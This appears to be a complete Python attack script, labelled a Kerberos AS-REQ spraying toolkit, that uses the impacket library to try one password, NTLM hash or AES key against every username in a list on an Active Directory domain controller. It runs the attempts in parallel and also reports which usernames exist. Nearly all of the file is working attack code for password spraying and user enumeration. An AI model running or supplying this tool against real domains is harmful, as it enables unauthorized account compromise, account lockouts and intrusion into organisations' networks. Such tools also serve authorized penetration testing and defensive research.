#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import argparse
import sys
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import multiprocessing
import socket


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        print('[+]Success %s/%s' % (domain, username) )
    except KerberosError as e:
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
           print("[-]Could not find username: %s/%s" % (domain, username) )
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            return
        else:
            print(e)
    except socket.error as e:
        print('[-]Could not connect to DC')
        return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Kerberos AS-REQ Spraying Toolkit")
    
    group = parser.add_argument_group('authentication')
    group.add_argument('-userlist', action='store', metavar = "userlist", help='List of users to spray, format is [[domain/]username')
    group.add_argument('-password', action="store", metavar = "password", help='Clear-text password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-domain', action='store', metavar="domain",
                       help='FQDN of the target domain')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    
    options = parser.parse_args()

    if options.password is None and options.hashes is None and options.aesKey is None:
        parser.print_help()
        sys.exit(1)
    
    if options.userlist is None:
        parser.print_help()
        sys.exit(1)

    if options.dc_ip is None:
        parser.print_help()
        sys.exit(1)

    if options.domain is None:
        parser.print_help()
        sys.exit(1)

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''
    
    if options.password is None:
        password = ''
    else:
        password = options.password

    
    #threading
    jobs = []

    with open(options.userlist, 'r') as users:
        for _user in users.readlines():
            domain = options.domain
            try:
                domain, user = _user.split("/")
            except:
                user = _user
            process = multiprocessing.Process(target=login,
                args=(user.strip(), password, domain, lmhash, nthash, options.aesKey, options.dc_ip))
            jobs.append(process)

    # Start the processes
    for j in jobs:
        j.start()

    # Ensure all of the processes have finished
    for j in jobs:
        j.join()    

if __name__ == "__main__":
    main()